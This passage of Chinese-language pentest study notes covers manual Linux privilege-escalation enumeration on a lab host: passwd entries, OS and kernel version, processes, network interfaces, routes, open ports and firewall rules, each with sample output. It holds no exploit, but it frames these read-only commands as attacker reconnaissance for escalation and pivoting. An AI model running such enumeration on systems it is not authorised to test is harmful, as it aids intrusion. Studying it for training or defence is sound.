systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash
```
> `www-data`與 `sshd`。表示系統上可能安裝了 Web Server 和 SSH Server。\
> `x`: 包含使用者密碼的雜湊版本，包含在 /etc/shadow\
> `UID` : 1000 - 除了 root 使用者的 UID 為 0 外，Linux 從 1000 開始計數普通使用者 ID。\
> `GID`： 1000 － 代表使用者特定的群組 ID。\
> `/home/joe`: 描述使用者登入時提示的主目錄\
> `/bin/bash`: － 表示預設 interactive shell
>> 另一個 user: eve ， 配置的主資料夾在 /home/eve

>[!Important]
>system services 將 `/usr/sbin/nologin` 作為登入 shell，其中nologin 用於阻止服務帳戶的任何遠端或本機登入

#### - hostname
主機名稱通常可以提供有關其功能的線索，`web` 表示 Web server，`db` 表示資料庫伺服器，`dc` 表示 domain controller
```
joe@debian-privesc:~$ hostname
debian-privesc
```
企業通常會對 hostname 命名，以便按位置、描述、作業系統和服務等級進行分類。通常由兩部分組成: `OS type` + `description`\
#### - /etc/issue & /etc/os-release
issue 和 os-release 檔案包含作業系統版本（Debian 10）和特定於發布的信息，包括 distribution codename。
```
joe@debian-privesc:~$ cat /etc/issue
Debian GNU/Linux 10 \n \l

joe@debian-privesc:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```
#### - uname -a
輸出作業系統核心版本（4.19.0）和架構（x86_64）
```
joe@debian-privesc:~$ uname -a
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux
```

#### - ps aux
列出系統process（包括 privileged users)
```
joe@debian-privesc:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169592 10176 ?        Ss   Aug16   0:02 /sbin/init
...
colord     752  0.0  0.6 246984 12424 ?        Ssl  Aug16   0:00 /usr/lib/colord/colord
Debian-+   753  0.0  0.2 157188  5248 ?        Sl   Aug16   0:00 /usr/lib/dconf/dconf-service
root       477  0.0  0.5 179064 11060 ?        Ssl  Aug16   0:00 /usr/sbin/cups-browsed
root       479  0.0  0.4 236048  9152 ?        Ssl  Aug16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1656  0.0  0.0      0     0 ?        I    01:03   0:00 [kworker/1:2-events_power_efficient]
joe       1657  0.0  0.4  21160  8960 ?        Ss   01:03   0:00 /lib/systemd/systemd --user
joe       1658  0.0  0.1 170892  2532 ?        S    01:03   0:00 (sd-pam)
joe       1672  0.0  0.2  14932  5064 ?        S    01:03   0:00 sshd: joe@pts/0
joe       1673  0.0  0.2   8224  5020 pts/0    Ss   01:03   0:00 -bash
root      1727  0.0  0.0      0     0 ?        I    03:00   0:00 [kworker/0:0-ata_sff]
root      1728  0.0  0.0      0     0 ?        I    03:06   0:00 [kworker/0:2-ata_sff]
joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu
```
> `a（all）`：顯示所有使用者的 process。\
`x`：顯示不與終端（[TTY](https://www.linusakesson.net/programming/tty/)）關聯的進程，例如系統守護（daemons）。\
`u（user-readable）`：較易讀的格式顯示進程資訊，包括使用者名稱、CPU 使用率、記憶體使用率等。
>> 輸出列出了以 root 身分運行的幾個 process，這些 process 值得研究可能存在的漏洞\
>> `joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu`: 可以看到當下輸入的 ps command 也列在輸出中。可以使用適當的使用者名稱從輸出中過濾特定的使用者擁有的 process。

#### - network interfaces, routes, and open ports
使用 ifconfig 或ip列出每個網路介面卡的 TCP/IP 設定
- `ifconfig`: 顯示 interface statistics
- `ip`: compact version of the same information

```
joe@debian-privesc:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:b9:fc brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.214/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:b9fc/64 scope link
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:8a:72:64 brd ff:ff:ff:ff:ff:ff
    inet 172.16.60.214/24 brd 172.16.60.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:7264/64 scope link
       valid_lft forever preferred_lft forever
```

使用 route 或 routel 顯示網路路由表
- routel
```
joe@debian-privesc:~$ routel
         target            gateway          source    proto    scope    dev tbl
/usr/bin/routel: 48: shift: can't shift that many
        default     192.168.50.254                   static          ens192
    172.16.60.0 24                   172.16.60.214   kernel     link ens224
   192.168.50.0 24                  192.168.50.214   kernel     link ens192
      127.0.0.0          broadcast       127.0.0.1   kernel     link     lo local
      127.0.0.0 8            local       127.0.0.1   kernel     host     lo local
      127.0.0.1              local       127.0.0.1   kernel     host     lo local
127.255.255.255          broadcast       127.0.0.1   kernel     link     lo local
    172.16.60.0          broadcast   172.16.60.214   kernel     link ens224 local
  172.16.60.214              local   172.16.60.214   kernel     host ens224 local
  172.16.60.255          broadcast   172.16.60.214   kernel     link ens224 local
   192.168.50.0          broadcast  192.168.50.214   kernel     link ens192 local
 192.168.50.214              local  192.168.50.214   kernel     host ens192 local
 192.168.50.255          broadcast  192.168.50.214   kernel     link ens192 local
            ::1                                      kernel              lo
         fe80:: 64                                   kernel          ens224
         fe80:: 64                                   kernel          ens192
            ::1              local                   kernel              lo local
fe80::250:56ff:fe8a:7264              local                   kernel          ens224 local
fe80::250:56ff:fe8a:b9fc              local                   kernel          ens192 local
```
可以使用 netstat 或 ss 顯示活動的網路連接和監聽端口
- ss -anp
```
joe@debian-privesc:~$ ss -anp
Netid      State       Recv-Q      Send-Q                                        Local Address:Port                     Peer Address:Port
nl         UNCONN      0           0                                                         0:461                                  *
nl         UNCONN      0           0                                                         0:323                                  *
nl         UNCONN      0           0                                                         0:457                                  *
...
udp        UNCONN      0           0                                                      [::]:47620                            [::]:*
tcp        LISTEN      0           128                                                 0.0.0.0:22                            0.0.0.0:*
tcp        LISTEN      0           5                                                 127.0.0.1:631                           0.0.0.0:*
tcp        ESTAB       0           36                                           192.168.50.214:22                      192.168.118.2:32890
tcp        LISTEN      0           128                                                       *:80                                  *:*
tcp        LISTEN      0           128                                                    [::]:22                               [::]:*
tcp        LISTEN      0           5                                                     [::1]:631                              [::]:*
```
> `ss（Socket Statistics）`：比 `netstat` 更快更現代。\
`-a（all）`：顯示所有 socket，包含 LISTEN 和非 LISTEN 狀態的連線。\
`-n（numeric）`：以數字格式顯示地址和端口，避免解析 DNS（加快查詢速度）。\
`-p（process）`：顯示與每個 socket 關聯的 process 名稱（需要 root 權限）。
>> 可以看到目前連線的 SSH connection 和 listening socket

#### - firewall rules 
1. 主要注意評估的遠端利用階段防火牆的 state, profile, and rules，在提權也可能會使用到。
2. 收集有關 inbound 與 outbound port filtering 的資訊，以便在轉向內部網路時方便進行 port forwarding 和 tunneling 傳輸。
3. 必須具有 root 權限才能使用 iptables 列出防火牆規則，🥚 防火牆的 configured，可以作為一般使用者收集有關規則的資訊。其中也包含 `iptables-save` 創建的檔案，將 firewall configuration 轉存到 user 中

```
joe@debian-privesc:~$ cat /etc/iptables/rules.v4
# Generated by xtables-save v1.8.2 on Thu Aug 18 12:53:22 2022
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT
COMMIT
# Completed on Thu Aug 18 12:53:22 2022
```
>`-A INPUT -p tcp -m tcp --dport 1999 -j ACCEPT`: 允許所有連接到 TCP 1999 port 的流量進入 (可能是某個服務在監聽）

#### - cron ( job scheduler)
